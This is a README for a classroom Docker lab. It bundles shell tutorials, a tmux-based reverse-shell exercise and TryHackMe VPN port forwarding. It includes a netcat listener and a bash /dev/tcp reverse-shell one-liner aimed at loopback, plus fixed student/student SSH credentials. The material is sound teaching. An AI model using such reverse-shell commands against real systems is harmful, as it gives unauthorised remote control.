# shell-attack-lab

社課用的跨平台 Docker 容器，把 **shell 互動練習、reverse shell、TryHackMe VPN** 三件事打包好。Windows / macOS 操作完全一致。

## 30 秒上手

1. 安裝 [Docker Desktop](https://www.docker.com/products/docker-desktop/)
2. 在這個資料夾跑 `./start.sh`（macOS）或 `.\start.ps1`（Windows）
3. `ssh -p 2222 student@127.0.0.1`（密碼 `student`），進去後輸入 `tutorial`

> **學員第一次用請看 [`學員指南.md`](學員指南.md)**（包含 Docker 安裝、常見問題、三週課程操作）。本 README 是給老師/TA 看的設計與維護筆記。

---

## 三個情境

1. **Shell 互動練習**：互動式 tutorial 帶學員從 `pwd` 走到 pipe；每題實際在 sandbox 執行並驗證輸出。
2. **Reverse shell 練習**：學員 SSH 進容器後 `tmux` 切兩個 pane，一個當 attacker、一個當 victim，全部在同一容器完成，不需多開機器。
3. **TryHackMe 實作**：容器內跑 OpenVPN；host 端 `forward.ps1` / `forward.sh` 問靶機 IP 後一鍵 `ssh -L`，瀏覽器直接看 THM 靶機網頁。

## 為什麼是這個架構

| 需求 | 解法 |
|------|------|
| 跨平台（Win / macOS） | 容器當「lab box」，host 只用 SSH 進去；SSH 是兩平台內建的 |
| Host 看 THM 網頁 | `ssh -L` 內建 port forwarding；不用裝任何工具、不需管理員權限 |
| Reverse shell 練習要多 TTY | tmux 在容器內切 pane；不用 host 也跑 listener |
| 學員第一次接觸 shell | `tutorial` 互動腳本：每關出題，捕獲指令並驗證輸出 |
| 速查 | `cheat <主題>`：shell / reverse-shell / tmux / thm |

## 系統需求

- Docker Engine 20.10+ / Docker Desktop（含 `docker compose` 子指令）
- 一個 SSH 客戶端（Win10/11 內建 OpenSSH，macOS 內建）
- 想跑 THM 段：一份 `.ovpn` 設定檔（從 TryHackMe 帳號下載）

## 快速開始

```bash
# 啟動
./start.sh        # macOS / Linux
.\start.ps1       # Windows PowerShell

# 進容器
ssh -p 2222 student@127.0.0.1     # 密碼: student
```

進去之後直接打 `tutorial` 就會跑互動教學。`lab-help` 隨時看選單。

## 容器內提供的指令

| 指令 | 用途 |
|------|------|
| `tutorial` | 互動式 shell 入門，10 關 |
| `cheat <主題>` | 速查表，主題：`shell`、`reverse-shell`、`tmux`、`thm` |
| `lab-help` | 顯示歡迎訊息與指令清單 |
| `vpn-up` | 啟動 OpenVPN（讀 `/vpn/config.ovpn`，背景跑） |
| `vpn-down` | 斷開 OpenVPN |

預先安裝的工具：`tmux`、`vim`、`nano`、`netcat-openbsd`、`socat`、`curl`、`wget`、`python3`、`jq`、`tree`、`man-db` 等。

`nmap`、`gobuster` 等掃描工具**故意**沒預裝——學員當場 `sudo apt install nmap gobuster` 就是課程的一部分（student 帳號允許 sudo 跑 `apt`/`apt-get`）。

## 架構

```
┌────────────────────────────────────────────────────────────┐
│ HOST (Windows / macOS / Linux)                             │
│                                                            │
│   $ ssh -p 2222 student@127.0.0.1                          │
│   $ ssh -p 2222 -L 8080:<TARGET_IP>:80 student@127.0.0.1     │
│   browser → http://127.0.0.1:8080                          │
│                          │                                 │
└──────────────────────────┼─────────────────────────────────┘
                           │  127.0.0.1:2222 → :22
                           ▼
┌────────────────────────────────────────────────────────────┐
│ CONTAINER (debian:bookworm-slim)                           │
│   sshd  (always running)                                   │
│   user:  student / student                                 │
│                                                            │
│   $ tutorial / cheat / tmux / vpn-up                       │
│                          │                                 │
│                       OpenVPN ─── tun0 ──► THM 靶機網段    │
└────────────────────────────────────────────────────────────┘
```

`ssh -L` 的妙處：學員 ssh 連線是接到容器，但這條連線的 port forward 卻是在容器**內部**發起，所以可以直接走容器的 `tun0` 到 THM。Host 完全不需要設路由。

## 三個情境的操作 SOP

### 情境 1：Shell 互動練習

```bash
# host
ssh -p 2222 student@127.0.0.1
# 容器內
$ tutorial
```

教學過 10 關，學員學到 `pwd`、`whoami`、`id`、`ls`、`ls -la`、`cd`、`mkdir`、`>` 重導、`cat`、`|` pipe。

### 情境 2：Reverse shell（同容器、tmux 兩 pane）

```bash
# host
ssh -p 2222 student@127.0.0.1
# 容器內
$ tmux new -s lab
# Ctrl-b | 分左右
# 左 pane (attacker)
$ nc -lnvp 4444
# 右 pane (victim)
$ bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
# 切回左 pane（Ctrl-b ←），shell 已經進來
$ id
```

完整變體看 `cheat reverse-shell`。

### 情境 3：TryHackMe + 瀏覽器看靶機

```bash
# host：先把 .ovpn 放到 ./vpn/config.ovpn
./start.sh    # 或 .\start.ps1

# host：進容器啟動 VPN
ssh -p 2222 student@127.0.0.1
$ vpn-up
$ ping -c 2 <TARGET_IP>     # 確認連得到
# Ctrl-D 登出 SSH（或 tmux 留著）

# host：另開一個終端機做 port forward（保持這個 ssh 視窗不關）
./forward.sh     # 或 .\forward.ps1
# 腳本會問靶機 IP 跟 port，直接告訴你瀏覽器要開的網址

# host：瀏覽器
http://127.0.0.1:8080
```

`forward` 腳本只是包裝 `ssh -p 2222 -L <local>:<TARGET_IP>:<port> student@127.0.0.1`，不想用腳本的可以直接下指令，公式看 `cheat thm`。

## 安全考量

- SSH port 只綁 `127.0.0.1:2222`，同網段他人連不進來。
- 內建學員帳密 `student / student` 是給 lab 環境用的方便密碼，**不要**把這個容器暴露到公開網路。
- `vpn/config.ovpn` 在 `.gitignore` 內，不會誤推到版控。
- `student` 只能 sudo `vpn-up` / `vpn-down`，不是全 sudo（避免學員「修壞」容器）。

## 疑難排解

| 症狀 | 對策 |
|------|------|
| `ssh: connect to host 127.0.0.1 port 2222: Connection refused` | 容器還沒起來。`docker compose ps` 看狀態，`docker compose logs lab` 看 log |
| `Permission denied (publickey,password)` | 密碼是 `student`（小寫，沒空白）|
| `vpn-up` 卡住 / AUTH_FAILED | `.ovpn` 壞了或不對；THM 不需要帳密，重下一份 |
| `ping` 不到 <TARGET_IP> | THM 房間要按 Start Machine；`ip route` 看 tun0 路由是否存在 |
| Port forward 沒反應 | 確認用的是「另一個」SSH 連線、且容器內 `vpn-up` 真的成功 |
| 重 build 後 SSH 抱怨 host key changed | 我們把 host key 烤進 image；如果你 rebuild 過，刪掉 `~/.ssh/known_hosts` 內 `[127.0.0.1]:2222` 那行 |

## 檔案結構

```
docker/
├── Dockerfile
├── docker-compose.yml
├── entrypoint.sh                              啟動 sshd
├── container/                                 (COPY 進 image)
│   ├── etc/{motd,sudoers.d/student,ssh/sshd_config.d/lab.conf}
│   ├── home/student/{.bashrc,.tmux.conf}
│   └── usr/local/
│       ├── bin/{tutorial,cheat,vpn-up,vpn-down,lab-help}
│       └── share/lab/cheats/*.txt
├── vpn/                                       host 放 config.ovpn 處（mount 進去）
├── start.{ps1,sh}  stop.{ps1,sh}              啟動/停止
├── forward.{ps1,sh}                            問靶機 IP/port 後一鍵 SSH + port forward
├── README.md                                  本檔
├── 學員指南.md                                 給學員的步驟手冊
└── .gitignore
```

## 客製化

- 加題目：編輯 `container/usr/local/bin/tutorial` 的 `STEPS` 列表。
- 加 cheat：丟一個 `<topic>.txt` 到 `container/usr/local/share/lab/cheats/`，重 build。
- 改 SSH 帳密：Dockerfile 裡的 `echo 'student:student' | chpasswd`。
- 改 SSH port：`docker-compose.yml` 的 `ports` 跟學員指南一起改。
- 加工具：Dockerfile `apt-get install` 的清單。

## 開發 / 除錯

```bash
# 重 build
docker compose build --no-cache

# 進容器當 root
docker compose exec --user root lab bash

# 看 sshd log
docker compose logs -f lab

# 看 OpenVPN log（容器內）
sudo tail -f /var/log/openvpn.log
```
